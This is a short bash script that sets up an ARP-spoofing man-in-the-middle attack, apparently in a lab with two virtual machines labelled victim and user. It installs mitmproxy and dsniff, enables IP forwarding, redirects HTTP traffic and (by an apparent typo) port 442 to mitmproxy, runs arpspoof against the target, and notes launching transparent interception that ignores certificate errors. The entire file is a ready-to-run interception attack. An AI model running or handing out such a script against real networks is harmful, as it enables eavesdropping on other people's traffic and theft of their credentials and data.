#!/bin/bash

VM_VICTIM_IP="192.168.179.3"
VM_USER_IP="192.168.179.5"

# tools
sudo apt-get install -y mitmproxy dsniff
sudo apt-get install -y wireshark

# enabling ip forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# setting up ip tables
# redirect HTTP traffic to mitmproxy port
sudo iptables -t nat -A PREROUTING -i enp0s3 -p tcp --dport 80 -j REDIRECT --to-port 8080
# redirect HTTPS traffic to mitmproxy port
sudo iptables -t nat -A PREROUTING -i enp0s3 -p tcp --dport 442 -j REDIRECT --to-port 8080
# starting arpspoof to redirect traffic from victim to attacker
sudo arpspoof -i enp0s3 -t $VM_USER_IP $VM_VICTIM_IP

# by default, mitmproxy validates SSL/TLS certificates of servers it connects to
# the ssl insecure flag tells mitmproxy to ignore SL/TLS certificate validation errors, allowing you to intercept and inspect SSL/TLS traffic even if the certificates are not valid or trusted
# this command needs to be run in another terminal in order to intercept traffic
# mitmproxy --mode transparent --ssl-insecure
# wireshark
# sudo wireshark